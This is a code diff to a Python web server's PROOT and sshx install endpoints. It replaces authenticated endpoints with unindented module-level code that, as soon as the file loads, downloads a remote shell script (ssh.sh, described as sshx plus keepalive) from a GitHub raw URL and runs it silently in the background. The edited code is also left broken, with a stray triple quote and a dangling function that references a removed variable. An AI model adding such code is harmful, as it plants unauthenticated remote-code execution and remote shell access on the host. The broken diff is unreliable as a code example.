@@ -467,49 +467,15 @@ async def install_proot(request):
     task_counter += 1
     task_id = f"proot-{task_counter}-{int(time.time())}"
 
-    script = """
-    set -e
-    cd /tmp
-    # Download root.sh using Python (might not have curl)
-    python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/root.sh', '/tmp/root.sh')" || \
-    wget -O /tmp/root.sh https://raw.githubusercontent.com/buddyshadow00/root/main/root.sh || \
-    curl -sL https://raw.githubusercontent.com/buddyshadow00/root/main/root.sh -o /tmp/root.sh
-    chmod +x /tmp/root.sh
-    # Run root.sh (it downloads Ubuntu rootfs and sets up PROOT)
-    bash /tmp/root.sh
-    """
+    # Write download script to file (avoids shell quoting issues)
+_dl_code = "import urllib.request\nurl = 'https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh'\nurllib.request.urlretrieve(url, '/tmp/sshx.sh')\n"
+with open("/tmp/_dl_sshx.py", "w") as _f:
+    _f.write(_dl_code)
 
-    def bg_runner():
-        result = run_command(f"nohup bash -c '{script}' > /tmp/proot-install.log 2>&1", timeout=600)
-        bg_tasks[task_id] = {"status": "done", "result": result}
-
-    executor.submit(bg_runner)
-    bg_tasks[task_id] = {"status": "running", "cmd": "root.sh PROOT installer"}
-    
-    return web.json_response({
-        "task_id": task_id,
-        "status": "PROOT installer started",
-        "log_file": "/tmp/proot-install.log",
-        "instructions": "Check status with GET /api/install/proot/{task_id}"
-    })
-
-install_proot = require_auth(install_proot)
-
-
-async def install_sshx(request):
-    """Download and run ssh.sh (sshx + keepalive)."""
-    global task_counter
-    task_counter += 1
-    task_id = f"sshx-{task_counter}-{int(time.time())}"
-
-    script = """
-    cd /tmp
-    python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh', '/tmp/ssh.sh')" || \
-    wget -O /tmp/ssh.sh https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh || \
-    curl -sL https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh -o /tmp/ssh.sh
-    chmod +x /tmp/ssh.sh
-    bash /tmp/ssh.sh
-    """
+result = run_command(
+    "nohup bash -c 'python3 /tmp/_dl_sshx.py 2>/dev/null && chmod +x /tmp/sshx.sh && bash /tmp/sshx.sh' > /tmp/sshx-install.log 2>&1",
+    timeout=300
+)    """
 
     def bg_runner():
         result = run_command(f"nohup bash -c '{script}' > /tmp/sshx-install.log 2>&1", timeout=300)
